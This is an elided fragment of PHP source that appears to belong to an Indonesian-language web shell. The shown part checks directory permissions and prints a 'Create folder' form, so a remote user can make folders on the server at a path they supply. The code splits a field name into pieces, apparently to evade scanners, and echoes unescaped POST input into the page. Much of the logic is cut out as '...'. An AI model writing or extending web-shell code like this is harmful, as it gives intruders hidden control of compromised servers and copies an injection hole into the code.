    ...
    if ($isw("./") || $ird("./")) {
        ...
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                <input type="hidden" name="pilih" value="folder"></form>';} else {
            ...
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
